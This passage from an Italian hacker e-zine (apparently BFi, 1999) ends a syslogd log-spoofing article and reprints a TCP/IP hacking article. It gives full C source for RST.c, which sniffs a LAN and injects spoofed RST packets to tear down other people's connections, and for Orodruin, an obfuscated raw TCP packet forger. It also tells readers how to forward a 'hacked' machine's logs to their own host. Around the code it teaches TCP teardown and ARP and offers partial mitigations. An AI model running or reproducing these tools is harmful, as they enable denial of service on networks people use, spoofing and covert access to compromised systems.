        if((ns = accept(s, (struct sockaddr *) &sunx, &len)) < 0) {
                        perror("accept");
                        exit(1);
                        }

        if((read(ns, buf, sizeof(buf))) < 0) {
                perror("read");
                exit(1);
                }

        printf("%s\n", buf);

        strncpy(pkt.data, buf, sizeof(buf));

        if((sendto(s2, &pkt, sizeof(pkt), 0, (struct sockaddr *) &to,
                sizeof(struct sockaddr))) < 0) {
                        perror("sendto");
                        exit(1);
                        }

        close(ns);
        }
        close(s2);
        close(s);
        printf("complete.\n");
}
---------- snip ----------

Ok. Ora siamo con la coscienza a posto :) Ci basta lanciare il nostro piccolo
prg con un bel "./vru `hostname`" e avremo i log sia per noi che per il
syslogd. :)

Un'altra bella cosa che ci fa avere la coscienza a posto, questa volta senza
sudare neanche un po' :), e' il famosissimo "-- MARK --" implementato una
fredda mattina del Febbraio scorso dal nostro carissimo Martin Schulze:
viene, infatti, scritto direttamente :) (sempre che il syslogd sia attivo :P)
ricordatevi - come anche la parola inglese suggerisce :) - che e' un segno,
che se venisse a mancare, potrebbe essere segnale di un'anomalia.

Un'altra piccola cosa che possiamo fare a livello locale con il syslogd e'
leggere tutti i log generati dalla macchina hacked tranquillamente sulla
nostra macchina, senza scomodare la sessione telnet o ftp (con conseguenziali
log utmp/wtmp/etcetc :) ... Ci basta far girare sulla nostra macchina unix il
syslogd in modalita' 'accept remote messages' (flag -r) e aggiungere un'entry
sulla macchina hacked del tipo:

*.*		@mio.ip.son.mil

e riceveremo tutti i logs di quella macchina senza scomodare nessuno :)
Ricordatevi pero' di togliere l'entry una volta finito l'hack :))

Ora facciamo i buonini, diamo anche una SEMPLICE soluzione al problema,
senza andare a toccare il codice e risolvendo pero' solo in parte il dramma :)
Come dice anche la man del syslogd, possiamo limitare gli accessi alla 514
attraverso un firewall:

       1.     Implement  kernel  firewalling to limit which hosts
              or networks have access to the 514/UDP socket.

Altrimenti bisognerebbe intervenire a livello di codice per implentare
un'autenticazione host-to-host or something like that.

E diamo anche una patch per il problema della socket, 
da considerarsi TEMPORANEA, dato che non sono sicuro della sua completa
operativita'. Possiamo, infatti, fare un 'chmod +t /dev', in modo da settare
lo 'sticky bit' e risolvere il problema.
Ripeto pero' che non so quali effetti collaterali possa avere, in termini
di accesso da parte di terzi.

Ci vediamo con il syslogd trojan :)

ave atque vale.

/*
	*	THANKS TO:						      *
	*	Hobbit for idea about udp packet to 514       		      *
	*       FuSyS for idea about vru prg				      *
	*	|TSuNaMi| for tha moral support		 		      *
	*	PhoenYx QuetzaCoatl for my joke :) testing walla walla codez  *
	*								      *
	*	GREETINGS TO:						      *
	*	pIGpEN the misanthropic spirit of s0ftpj, FUCK THA RULEZ      *
	*	gambino and SMaster those of the unlight		      *
*/

			.bELFaghor VampErotic Daem0n.
			(kisses flooding to my whore)


--------------------[ TCP/iP HACKS F0R PHUN AND PR0FiT ]----------------------
-----------------------[ da: TCP/iP T00LS UNLiMiTED  ]------------------------
----------------------------------[ FuSyS ]-----------------------------------

NO(C)1999 FuSyS
		
#############################################################################
DISCLAIMER
Se qualcuno si sta ormai chiedendo che diavolo siano questi benedetti TCP/IP
Tools Unlimited da cui traggo articoli e codici... beh, NON si tratta di
un libro ordinabile da Amazon :) e no, non e' neanche un phile di testo.
Non e' un manuale tecnico ne' materiale trafugato da una telco. Ma se
ancora non ci aveste pensato, bastera' che raccogliate tutti i numeri di
BFi e potrete avere il grosso di questi miei scritti tutto per voi :)
In arrivo col numero 7 di BFi un pratico raccoglitore cartonato!
#############################################################################

URL del numero:     http://www.iinet.net.au/~bofh/index.html 
Se non avete mai letto gli aneddoti di Simon, BOfH per eccellenza, allora
non avete il diritto di continuare a leggere BFi :P
Ah, per chi non lo sapesse, BOfH sta per Bastard Operator fROM Hell :)))

Ok bando alla perdita di tempo.
Quello che avete tra le mani (no, non PgDn o ^[[B) e' un testo su alcuni
aspetti del set di protocolli TCP/IP che possano esserci utili in una
rete. Per rete questa volta non intendo necessariamente InterNet, quanto
anche una piccola LAN, magari quella della scuola, dell'ufficio, di camera
vostra o della vostra CON(vention) preferita.

Per hacks intendo piccoli usi e variazioni sul tema in maniera abile e
giocosa piu' che diretti ad un preciso fine. Se vi state chiedendo se si
possa usare con questa accezione, beh, si puo'. Lo dice il jargon :) 

Requisiti: conoscenza di base di TCP/IP ['di base' non vuol dire 'nulla']

T C P / I P

In alcuni dei miei articoli ho gia' presentato alcune caratteristiche di
questo set di protocolli. Ho mostrato gli header ed alcune librerie usate
per la programmazione a basso livello. Si', perche' non possiamo o dobbiamo
assolutamente accontentarci di usare le normali chiamate delle API BSD
socket per manipolare le connessioni e le macchine intorno a noi. Ne'
possiamo fidarci del kernel perche' agisca come vorremmo noi :) ....
Come abbiamo visto nella prima parte del progetto 0N0S3NDAi abbiamo la
possibilita' di creare i nostri pacchetti IP ed inserirli nel normale
flusso della comunicazione gestito dal kernel. Cosi' possiamo forgiare
pacchetti con indirizzi spoofati, possiamo manipolare connessioni ed
intercettare dati.

Questo e' alla base anche di questo articolo. Per prima cosa quindi vi
mostro come creare un semplice pacchetto IP. No, non un vero e proprio
programma quanto una specie di HOWTO.

Abbiamo per prima cosa bisogno di un po' di memoria, di un buffer. Quello
che potete facilmente vedere spulciando nei sorgenti del kernel di linux o
di un BSD, e' come il sistema gestisca le comunicazioni usando dei buffer
che vengono manipolati man mano che si passa da uno strato all'altro del
set di protocolli [in un prossimo articolo vedremo tutto il passaggio
dalla scheda di rete all'applicazione e viceversa nel nuovo kernel di
linux, il 2.2]. Questi buffer, chiamati sk_buff sotto linux e mbuf sotto
BSD4.4, servono per contenere gli header ed i dati dei pacchetti IP (ma 
non solo) che vengono poi trasmessi dalle varie interfacce di rete del
sistema. Si', anche via modem avete un'interfaccia di rete. E' proprio
quella che attraverso SLIP/PPP ed il modem comunica con il gateway del
vostro ISP.

Quindi, non usando il kernel per i nostri pacchetti non possiamo avere un
buffer di questo tipo. Ci accontenteremo :) di un semplice array di
char. Per l'uso che ne faremo possono bastare array di non piu' di 1500,
2500 byte. Ovviamente sta poi a voi ed all'uso che ne farete, ed alla
implementazione dei vostri tool, la specifica delle dimensioni dei
suddetti array. Infatti il kernel sara' comunque in grado di frammentare
per noi tali pacchetti a seconda del MTU della interfaccia di rete. 

char buffer[1500];

Ho gia' parlato delle strutture dati ip, udp, tcp e icmp... basta che vi
spulciate ben bene la dir /usr/include/netinet/ alla ricerca di quel che
fa per voi. In questo caso, creando un semplice pacchetto IP useremo solo
<netinet/ip.h> :

struct iphdr *ip;

Perche' un puntatore a questa struttura? [sorry, ma non saro' io qui a
dirvi cosa sia un puntatore]. Semplice. Perche' useremo il puntatore come
foglio di carta velina da 'apporre' al nostro buffer per riempirlo come si
deve.

Dobbiamo pero' anche comunicare al kernel che abbiamo intenzione di creare
noi i nostri pacchetti, quindi la chiamata di socket(2) usera' come type
SOCK_RAW e come protocol IPPROTO_RAW. Dovremo anche comunicare la nostra
intenzione di manipolare direttamente l'header di IP. Quindi useremo
setsockopt(2), utilizzando IPPROTO_IP come level e IP_HDRINCL come
optname. Mi raccomando di controllare sempre le pagine man dei comandi e
funzioni che nomino.

A questo punto posso tranquillamente apporre il mio puntatore al mio buffer:

ip = (struct iphdr*) buffer;

Cosi' facendo avro' la possibilita' di manipolare il buffer come farebbe
(non proprio :) il kernel all'atto della creazione di un pacchetto:

ip->ihl = 5;
ip->version = 4;
/* ip->tos */
ip->tot_len = htons(sizeof(ip));
ip->id = 0;
ip->frag_off = 0;
ip->ttl = htons(255);
ip->protocol = IPPROTO_IP;
/* ip->check */
ip->saddr = inet_addr("1.1.1.1");
ip->daddr = inet_addr("2.2.2.2");

Alcuni parametri li ho saltati in quanto il kernel provvedera' lui stesso,
all'atto della trasmissione, a completare l'header di IP. A questo punto
posso inviare il tutto mediante una semplice chiamata sendto(2) dopo aver
ovviamente riempito anche una struttura di tipo sockaddr_in con il tipo di
protocollo (AF_INET), l'indirizzo del destinatario, ed il numero di porta
nel caso di TCP o UDP (0 negli altri).

Questo metodo e' quello utilizzato spessissimo, se non quasi sempre, in
moltissimi codici e tools di ogni genere in cui ci sia bisogno di
manipolare a basso livello TCP/IP. Ovviamente creare un pacchetto e
portare avanti connessioni, attacchi o difese non e' la stessa cosa. Ma
senza sapere come forgiare pacchetti, sara' dura fare il resto :)
Ora che questa e' fatta, passiamo ai TCP/IP hacks di questo articolo.

D I S T R U Z I O N E   C O N N E S S I O N I   T C P / I P

Nello scorso numero di BFi vi ho mostrato come avviene l'inizio di una
connessione TCP, ovvero mediante il 3-way handshake. In questo articolo
invece vi mostrero' come le connessioni vengono chiuse.

Vi sono essenzialmente due modi che si rifanno a due delle flag TCP: FIN e
RST.

Il primo metodo e' quello speculare del 3-way, senonche' servono 4
passaggi e non solo 3. Questo metodo e' quello del cosiddetto HALF-CLOSE.
Se infatti consideriamo la connessione TCP come full-duplex, possiamo
facilmente capire che entrambe le parti in causa debbano chiudere la loro
trasmissione. Per far questo si usa la flag FIN, di norma inviata quando
l'applicazione ha chiamato la chiusura del socket. La ricezione di un FIN
non vuol quindi dire che la connessione sia ultimata, quanto che e' stata
chiusa dalla parte che l'ha trasmessa. Per questo prende il nome di
half-close.

In pratica una parte invia un pacchetto TCP con la flag FIN, con o senza
trasmissione di ultimi dati mediante PSH. Il peer, risponde con un ack del
seq+1 ed invia a sua volta un pacchetto con i suoi ultimi dati (o no,
appena la trasmissione e' finita) e la flag FIN, che verra' riconosciuta
con un ack dalla prima parte che ha avviato la chiusura. Al solito un
diagramma aiutera', spero, la comprensione.

    --------------------------------------------------------
    |                                                      |
    |            -----------  FIN  ----------->            |
    |            <------  ACK (SEQ+1) ---------            |
    |	 CLIENT		 ( HALF-CLOSE )         SERVER     |
    |            <----------  FIN  ------------            |
    |            -------  ACK (SEQ+1) ---------            |
    |							   |
    --------------------------------------------------------


Durante il periodo half-close, il server potrebbe benissimo continuare a
trasmettere dati, anche se quasi nessuna delle applicazioni TCP utilizzi
questa possibilita'. Da RFC infatti, l'invio di una FIN comunica la fine
della trasmissione e NON la fine della possibilita' di ulteriore ricezione.

Gia' che siamo in argomento tanto vale aggiungere qui la spiegazione degli
stati di transizione di TCP. Avete presente quando utilizzate netstat(8) ?
Quei termini alla fine della riga, tipo ESTABLISHED, SYN_SENT...?
Alcuni sono abbastanza intuitivi, ma quelli piu' particolari hanno
effettivamente a che vedere con la chiusura mediante flag FIN.

Immaginate che io invii un pacchetto con FIN, passo nello stato FIN_WAIT_1
mentre la connessione, vista dal mio peer, passa in CLOSE_WAIT dopo avermi
inviato un ack. Se a questo punto ho ricevuto, invece dell'ack solo FIN
allora passo nello stato CLOSING, altrimenti in FIN_WAIT_2. Se ricevo sia
FIN che ack allora passo in TIME_WAIT in attesa che termini il doppio del
Maximum Segment Lifetime o 2MSL. Invece il mio peer dallo stato close_wait
passa, dopo invio del suo FIN in LAST_ACK in attesa del mio ack per poter
poi tornare nello stato CLOSED.

Ora che avete il mal di mare forse e' meglio che guardiate il diagramma:

				  |-------------------------------------|
				CLOSED -----------			|
 				  |		 | s: SYN		|
				  |		 |			|
	r: SYN  s: SYN/ACK	  |		 |			|
	      ---------------- LISTEN	      SYN_SENT			|
	      |					 |			|
	      |					 | r: SYN/ACK		|
	      |				 	 | s: ACK		|
	   SYN_RCVD ------- ESTABLISHED ----------			|
		   r: ACK	/ \					|
			      /     \   r: FIN				|
			    /	      \ s: ACK				|
	       ---------- /		\------- CLOSE_WAIT		|
	s: FIN |				      |			|
	       |    r: FIN s: ACK		      | s: FIN		|
	 FIN_WAIT_1 ------------- CLOSING	      |			|
	     | \		     |		  LAST_ACK -------------|
      r: ACK |	 \   r: FIN/ACK	     | r: ACK				|
	     |	   \ s: ACK	     |					|
	 FIN_WAIT_2  \ ---------- TIM_WAIT -----------------------------|

s: sends	r: receives

Ok, OK, non e' in postscript e non e' neanche un amore. Se ne volete uno
serio avete la possibilita' di scaricarlo dalla home page di Stevens,
l'autore di TCP/IP Illustrated. Dirigetevi su www.kohala.com .....

Tornando alla chiusura di connessioni TCP ho nominato anche la flag RST.
In generale, questa flag serve per i reset. Questi vengono inviati da TCP
ogni volta che un segmento o pacchetto non sembri corretto per la connessione
cui si riferisce. Ad esempio un reset viene inviato ogni qual volta arrivi
una richiesta di connessione ad una porta su cui non sia in ascolto alcun
processo.

Ad ogni modo la flag RST permette chiusure di tipo abortivo delle
connessioni in quanto: ogni dato che l'applicazione possa tenere in coda
viene scartato; ed il peer ha modo di capire che la connessione sia stata
abortita invece che chiusa. Comunque basta un solo pacchetto con flag RST.

    --------------------------------------------------------
    |                                                      |
    |    CLIENT  ------------ RST ------------> SERVER     |
    |                                                      |
    --------------------------------------------------------

Se avete digerito tutto fin qui vi starete chiedendo: "si' vabbe, ma che ci
faccio con 'sta roba ?!". Domanda legittima :) ma dovreste gia' esserci
arrivati. Se siete a scuola, ufficio o in altre occasioni in cui abbiate
accesso ad una rete locale, avrete la possibilita' di chiudere le
connessioni a vostro piacimento, decidendo di farlo in base a vari
parametri della connessione, come le porte, gli indirizzi IP, la quantita'
di dati trasmessi... ovviamente senza dover riconfigurare firewalls,
router od ogni altro segmento/processo di rete che possa insospettire gli
operatori BOfH :) [nel senso che loro gia' lo fanno e vogliono una loro
esclusiva...].

Se avete mai usato sniffit avrete anche visto il plugin Touch of Death che
permette di distruggere le connessioni. Cosa fa?

In pratica si tratta di sedere allegramente nella rete, avendo accesso al
livello di datalink; fatelo come preferite, con libpcap, SOCK_PACKET, bpf,
/dev/tap etc etc etc. A questo punto quando passa una richiesta di connessione
che non volete permettere, potete spacciarvi per il server remoto utilizzando
la flag RST, facendo credere che la porta remota non sia attiva.
Con questo metodo potete anche abortire connessioni in corso o chiuderle
dolcemente avviando, ad insaputa dell'host cui fate lo sgambetto, la
chiusura mediante FIN e portando avanti, col vostro codice, il conteggio
degli ack.

Con questo potrete divertirvi nella LAN della scuola, sempre che abbiate
accesso di superutente o possiate portarvi il vostro bel laptop con linux
sopra. Oppure potrete controllare, in mancanza di un buon firewall, gli
accessi ad host non permessi sulla vostra LAN.

Ora vi mostro il codice necessario. In pratica dovete semplicemente
crearvi una regola di uso, come per un firewall, confermata la quale,
creiate uno o piu' pacchetti con flag RST o FIN da parte del peer
lanciandoli all'host che ha richiesto i dati. Semplice IP SPOOFING vedente
quindi. Il codice accluso e' solo esplicativo. Non e' un gran che come
programma, ma fa quel che deve. Dovrebbe essere migliorato. Lo lascio a
voi. Sto gia' lavorando a TH0T :) non posso fare tutto io...

---------- snip ----------
/************************************************************************
*									*
* RST.c				Codice di accompagnamento a parte	*
*				dell'articolo "TCP/IP Hacks for Phun	*
*				and Profit" su BFi5. Puoi trovare BFi	*
*				all'URL http://softpj98.bbk.org/bfi/	*
*									*
*				RST Storm per distruggere link TCP	*
*				Forza Bruta. Non stile :) . Lo stile	*
*				dovete aggiungerlo voi. Questo e' solo	*
*				codice esplicativo, non supremo.	*
*									*
* 				(C)1999 FuSyS TCP/IP Tools Unlimited	*
************************************************************************/

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/if_ether.h>
#include <net/if.h>
#include <ioctls.h>

#define RSTS		10
#define IF		"eth0"

int sp_fd;

unsigned short ip_fast_csum(unsigned char *iph,unsigned long ihl) {
        unsigned long sum;

        __asm__ __volatile__("
            movl (%1), %0
            subl $4, %2
            jbe 2f
            addl 4(%1), %0
            adcl 8(%1), %0
            adcl 12(%1), %0
1:          adcl 16(%1), %0
            lea 4(%1), %1
            decl %2
            jne 1b
            adcl $0, %0
            movl %0, %2
            shrl $16, %0
            addw %w2, %w0
            adcl $0, %0
            notl %0
2:
 	    "
        : "=r" (sum), "=r" (iph), "=r" (ihl)
        : "1" (iph), "2" (ihl));
        return(sum);
}

struct tcppk {                         
        struct iphdr ip;
        struct tcphdr tcp;
        char data[1500];
};

struct pseudo {
	unsigned long saddr, daddr;
	unsigned char zero, proto;
	unsigned short len;
};

void raw(void)
{
    int opt=1;

    if((sp_fd=socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) <0){
        perror("\nRAWIP() RAW Socket problems [Died]");
        exit();
    }
    if(setsockopt(sp_fd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt)) <0){
            perror("RAWIP() Cannot set IP_HDRINCL [Died]");
            exit();
    }

}

int tap(char* device,int mode)
{
    int fd;
    struct ifreq ifr;

    if((fd=socket(AF_INET, SOCK_PACKET, htons(0x3))) <0){
        perror("SNIFF() SOCK_PACKET allocation problems [Died]");
        exit();
    }

    strcpy(ifr.ifr_name,device);
    if((ioctl(fd, SIOCGIFFLAGS, &ifr)) <0){    
        perror("SNIFF() Can't get device flags [Died]");
        close(fd);
        exit();
    }

    if(!mode)ifr.ifr_flags ^= IFF_PROMISC;
    else ifr.ifr_flags |= IFF_PROMISC;
    if((ioctl(fd, SIOCSIFFLAGS, &ifr)) <0){
        perror("SNIFF() Can't set/unset promiscuous mode [Died]");
        close(fd);
        exit();
    }

    if(!mode){
        close(fd);
        return(0);
    }
    else return(fd);
}

unsigned long in_aton(const char *str)
{
        unsigned long l;
        unsigned long val;
        int i;

        l = 0;
        for (i = 0; i < 4; i++)
        {
           l <<= 8;
           if (*str != '\0')
           {
               val = 0;
               while (*str != '\0' && *str != '.')
               {
                        val *= 10;
                        val += *str - '0';
                                str++;
                        }
                        l |= val;
                        if (*str != '\0')
                                str++;
                }
        }
        return(htonl(l));
}

void uff(void) {
	printf("\nUso: RST sourceIP src_port destIP dest_port\n\n");
	exit(1);
}

int main(int argc, char **argv) {

	unsigned char buffer[1500], checkbuff[32], checkbuff2[32];
	struct sockaddr_in sin, sin2;
	struct iphdr *ip;
	struct tcphdr *tcp;
	struct pseudo *psp, *psp2;
	struct tcppk tpk, tpk2;
	int sniff, snt, snt2, rst=0;
	unsigned long saddr, daddr;
	unsigned short src, dest;

	if(argc<5) {
		uff();
		exit(1);
	}
	saddr=in_aton(argv[1]);daddr=in_aton(argv[3]);
	src=htons(atoi(argv[2]));dest=htons(atoi(argv[4]));

	sniff=tap(IF, 1);
	raw();

	if(setpriority(0, 0, -20) <0){
                printf("\nRST setpriority Error\n");
        }

        ip = (struct iphdr *)(((char *)buffer)+14);
        tcp = (struct tcphdr *)(((char *)buffer)+(sizeof(struct iphdr)+14));
        psp = (struct pseudo *)checkbuff;
	psp2 = (struct pseudo *)checkbuff2;

	memset(&sin, 0, sizeof(sin));
        sin.sin_family=AF_INET;
        sin.sin_port=src;
        sin.sin_addr.s_addr=saddr;
	memset(&sin2, 0, sizeof(sin2));
	sin.sin_family=AF_INET;
        sin.sin_port=dest;
        sin.sin_addr.s_addr=daddr;

        memset(&tpk, 0, sizeof(tpk));
	memset(&tpk2, 0, sizeof(tpk2));
	memset(psp, 0, sizeof(struct pseudo));
	memset(psp2, 0, sizeof(struct pseudo));	

        tpk.ip.ihl=5;
        tpk.ip.version=4;
        tpk.ip.tos=0;
        tpk.ip.tot_len=htons(40);
        tpk.ip.frag_off=0;
        tpk.ip.ttl=64;
        tpk.ip.protocol=IPPROTO_TCP;
        tpk.ip.saddr=daddr;
        tpk.ip.daddr=saddr;
        tpk.tcp.source=dest;
        tpk.tcp.dest=src;
        tpk.tcp.doff=5;
        tpk.tcp.rst=1;
        tpk.tcp.ack=1;
        tpk.tcp.window=0;
        psp->saddr=tpk.ip.daddr;
        psp->daddr=tpk.ip.saddr;
        psp->zero=0;
        psp->proto=IPPROTO_TCP;
        psp->len=htons(20);
	tpk2=tpk;
	tpk2.ip.saddr=saddr;
	tpk2.ip.daddr=daddr;
	tpk2.tcp.source=src;
	tpk2.tcp.dest=dest;
	psp2->saddr=tpk.ip.saddr;
        psp2->daddr=tpk.ip.daddr;
        psp2->zero=0;
        psp2->proto=IPPROTO_TCP;
        psp2->len=htons(20);

        printf("RSTing :\t%s:%d > %s:%d\n",
                argv[1], src, argv[3], dest);
        while(read(sniff, &buffer, sizeof(buffer))) {
                if(ip->saddr==daddr &&
                   ip->daddr==saddr &&
                        tcp->source==dest &&
                        tcp->dest==src) {
			tpk.tcp.seq=tcp->seq+htonl(
                        	ntohs(ip->tot_len)-40);
                        tpk.tcp.ack_seq=tcp->ack_seq;
			tpk2.tcp.seq=tcp->ack_seq;
			tpk2.tcp.ack_seq=tcp->seq+htonl(
                                ntohs(ip->tot_len)-40);
                        memcpy(checkbuff+12, &tpk.tcp, 20);
                        tpk.tcp.check=ip_fast_csum(
                                (unsigned char *)checkbuff,32);
			memcpy(checkbuff2+12, &tpk2.tcp, 20);
                        tpk2.tcp.check=ip_fast_csum(
                                (unsigned char *)checkbuff2,32);
                          for(; rst<RSTS; rst++) {
				snt2=sendto(sp_fd, &tpk2, 40, 0,
				(struct sockaddr *)&sin2, sizeof(sin2));
                                snt=sendto(sp_fd, &tpk, 40, 0,
                                (struct sockaddr *)&sin, sizeof(sin));
                                if(snt<0)printf("[SP00F_ERROR]");
				else printf("[RST]");
                          }
			  break;
                }
        }
	printf("\n");
	tap(IF, 0);
	exit(0);
}
---------- snip ----------

S P 0 0 F E R  T C P 

Oltre a RST quello che vi lascio e' un codice per creare pacchetti IP+TCP.
Un forger TCP quindi. Potete specificare gli indirizzi IP, le porte ed
anche le flag TCP da inserire. Puo' essere molto utile per testare i
vostri firewall e router ed anche per cominciare a capire come fare a
programmare questi gingilli.

PERO'...

Pero' non ho usato il metodo normale che ho spiegato prima per creare
pacchetti, bensi' un altro. Uguale eppure molto diverso. Non solo nella
stesura del codice :P come penserete subito, ma anche nel metodo. Se
capirete quello, avrete in mano la chiave di lettura di molti exploit che
ci sono in giro :) ... tenete sempre un occhio al vostro libro/doc preferito
su TCP/IP.

Intanto ecco il codice:

---------- snip ----------
/************************************************************************
*									*
* ORODRUIN.c			Il Monte del Fato, la forgia entro cui	*
*				l' Uno e' stato creato, nella terra di	*
*				Mordor, dove l'ombra nera attende.	*
*									*
*				    Uno Spoof per regnarli,		*
*					Uno Spoof per trovarli, 	*
*				Uno Spoof per ghermirli, e nel buio	*
*				 incatenarli, nella terra di Redmond	*
*					dove il nero hacker attende ... *
*									*
* 				(C)1999 FuSyS TCP/IP Tools Unlimited	*
************************************************************************/

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <time.h>

unsigned short ip_fast_csum(unsigned char *iph,unsigned long ihl) {
        unsigned long sum;

        __asm__ __volatile__("
            movl (%1), %0
            subl $4, %2
            jbe 2f
            addl 4(%1), %0
            adcl 8(%1), %0
            adcl 12(%1), %0
1:          adcl 16(%1), %0
            lea 4(%1), %1
            decl %2
            jne 1b
            adcl $0, %0
            movl %0, %2
            shrl $16, %0
            addw %w2, %w0
            adcl $0, %0
            notl %0
2:
 	    "
        : "=r" (sum), "=r" (iph), "=r" (ihl)
        : "1" (iph), "2" (ihl));
        return(sum);
}

struct pseudo {
	unsigned long saddr, daddr;
	unsigned char zero, proto;
	unsigned short len;
};

unsigned long in_aton(const char *str)
{
        unsigned long l;
        unsigned long val;
        int i;

        l = 0;
        for (i = 0; i < 4; i++)
        {
           l <<= 8;
           if (*str != '\0')
           {
               val = 0;
               while (*str != '\0' && *str != '.')
               {
                        val *= 10;
                        val += *str - '0';
                                str++;
                        }
                        l |= val;
                        if (*str != '\0')
                                str++;
                }
        }
        return(htonl(l));
}

void uff(void) {
	printf("\nUso: Orodruin sourceIP destIP ");
	printf("[-h -s -d -n -F -S -R -P -A -U]\n");
	printf("        -h       questa litania di Angmar ...\n");
	printf("	-s porta l' origine dell' Uno\n");
	printf("        -d porta la destinazione dell' Uno\n");
	printf("        -n x     il numero delle creazioni\n");
	printf("        -FSRPAU  le bandiere dell'Uno\n\n");
	exit(1);
}
int main(int argc, char **argv) {

	unsigned char pkt[1500], *x0F, b, flags=0;
	struct sockaddr_in sin;
	struct pseudo psp;
	int fd, fdo, ln, i, snt, opt, hz=1, os=0, od=0;
	unsigned long saddr, daddr;
	unsigned short src=0, dest=0;

	if(argc<3) {
		uff();
		exit(1);
	}

	saddr=in_aton(argv[1]);daddr=in_aton(argv[2]);

	while ((opt = getopt(argc, (char**)argv, "hs:d:n:FSRPAU")) != EOF )
        {
                switch(opt)
                {
			case 'h':
			uff();
			exit(0);
			break;

			case 's':
			src=(unsigned short)atoi(optarg);
			os++;
			break;

			case 'd':
			dest=(unsigned short)atoi(optarg);
			od++;
			break;
	
			case 'n':
                        hz=atoi(optarg);
                        break;
		
			case 'F':
			flags|=0x01;
			break;

			case 'S':
                        flags|=0x02;
                        break;

			case 'R':
                        flags|=0x04;
                        break;

			case 'P':
                        flags|=0x08;
                        break;

			case 'A':
                        flags|=0x10;
                        break;

			case 'U':
                        flags|=0x20;
                        break;

			default:
			break;
		}
	}
	if((fd=socket(AF_INET, SOCK_RAW, IPPROTO_RAW))<0) {
		fprintf(stderr, "\nSOCK_RAW Died\n");
		exit(2);
	}
	fdo=1;
	if(setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &fdo, sizeof(fdo))<0) {
		fprintf(stderr, "\nHDRINCL Died\n");
		exit(3);
	}
	srand(time(NULL));
	printf("\n\033[1;34m----] \033[1;32mO R O D R U I N\033[0m");
        printf("\033[1;34m [----\033[0m");
        printf("\n\033[1;34m    TCP Forger by FuSyS\033[0m");
        printf("\n\033[1;34m   TCP/IP Tools Unlimited\033[0m");
        printf("\n\033[1;34m------------][-------------\033[0m\n\n");


     /* Magia Nera Del Re Stregone di Minas Morgul, Signore Dei Nazgul */

while(hz){if(!os)src=1024+(rand()%2000);if(!od)dest=rand()%2000;if(flags==0)
flags|=0x20|0x08;sin.sin_family=AF_INET;sin.sin_addr.s_addr=daddr;sin.sin_port=
dest;ln=sizeof(sin);x0F=pkt;memset((unsigned char*)x0F,0,1500);psp.saddr=saddr;
psp.daddr =daddr;psp.len=htons(20);psp.zero=0;psp.proto=6;b=0x45;memcpy(x0F,&b,
sizeof(unsigned char));x0F+=2;*((unsigned short*)x0F)=htons(40);x0F+=2;*((
unsigned short*)x0F)=0xFFFF;x0F+=2;*(( unsigned short*)x0F)=0x0000;x0F+=2;*((
unsigned char*)x0F)=0xFF;x0F+=1;b=6;memcpy(x0F,&b,sizeof(unsigned char));x0F+=3
;*((unsigned long*)x0F)=saddr;x0F+=4;*((unsigned long*)x0F)=daddr;x0F+=4;*((
unsigned short*)x0F)=htons(src);x0F+=2;*((unsigned short*)x0F)=htons(dest);x0F
+=2;*((unsigned long*)x0F)=htonl(rand());x0F+=4;*((unsigned long*)x0F)=htonl(
rand());x0F+=4;b=0x50;memcpy(x0F,&b,sizeof(unsigned char));x0F+=1;memcpy(x0F,
&flags,sizeof(unsigned short));x0F+=1;*((unsigned short*)x0F)=htons(1024);x0F+=
2;*((unsigned short*)x0F)=ip_fast_csum((unsigned char*)&psp,32);snt=sendto(fd,
pkt,40,0,(struct sockaddr*)&sin,ln);hz--;}

	exit(1);
}
---------- snip ----------

Oltre alla forma c'e' un particolare di grande importanza: il calcolo del
checksum relativo a TCP. Questo non e' semplice come per l'header IP, UDP
e ICMP, ma c'e' bisogno di una struttura particolare che contenga IP
sorgente e destinazione, le porte TCP, un char uguale a zero per padding e
la quantita' di dati trasmessa con l'header TCP. Ricordatevelo quando
creerete uno spoofer TCP.

P R O T O C O L L O   A R P
Address Resolution Protocol

Gli indirizzi IP, non dimentichiamolo, hanno un senso solo per lo stack
TCP/IP di una macchina. Ma ad un livello piu' basso come quello ethernet
per esempio, con un suo sistema proprietario di indirizzamento, non
servono a molto. Gli indirizzi IPv4 sono a 32bit, mentre quelli ethernet
sono a 48bit. Come fanno quindi i pacchetti a transitare da una macchina
all'altra, di rete in rete, solo con gli indirizzi IP?

Semplice. Esiste una cache che gestisce le conversioni, o meglio gli
appaiamenti IP/ethernet, host per host. Questa e' la cache ARP. Essa viene
gestita mediante un protocollo di interrogazione che permette alle
macchine di una rete di conoscere l'indirizzo hardware a partire da quello
IP. Potete trovare la specifica ARP nel RFC 826. Esiste anche un
protocollo inverso per macchine non dotate di disco, che debbano fare il
boot da un server in rete, e necessitino di conoscere il loro indirizzo
IP. Questo protocollo e' RARP, o Reverse ARP.

Il pacchetto ARP e' particolare rispetto a quelli visti fin ora nei miei
vari articoli, in quanto NON si basa su IP. Come potrebbe dal momento che
non posso raggiungere un altro host, anche conoscendo il suo IP, se non
conosco il suo indirizzo hardware? Dobbiamo capire che un conto e' il
routing IP, un conto la modalita' di trasferimento lungo la LAN da una
scheda ethernet ad un'altra.

Vediamo il pacchetto ARP tipo:

     6          6         2    2    2    1  1  2    6      4      6      4 
------------------------------------------------------------------------------
| ETHERNET | ETHERNET | FRAME|HARD|PROT|HW|PR| OP|SENDER|SENDER|TARGET|TARGET|
|   SRC    |   DEST   | TYPE |TYPE|TYPE|SZ|SZ|   |  ETH |  IP  |  ETH | IP   |
------------------------------------------------------------------------------

I primi due campi sono gli indirizzi ethernet sorgente e destinazione del
pacchetto. Poi vengono due byte che specificano il tipo di dati che segue.
Per le richieste o le risposte ARP e' uguale a 0x806 .

Hardware type specifica il tipo di hardware cui si riferiscono le operazioni
richieste dal pacchetto ARP. Per ethernet e' uguale a 1.
Il protocol type specifica il protocollo che viene usato come paragone. Per
IP e' 0x800.

Vengono poi due byte per specificare le dimensioni degli indirizzi hardware e
del protocollo. 6 per indirizzi ethernet e 4 per quelli IP.

OP specifica il tipo di operazione ARP. 1 per richieste ARP, 2 per
risposte ARP, 3 per richieste RARP e 4 per le risposte RARP.

Seguono poi gli indirizzi ethernet ed IP del sorgente e del destinatario.

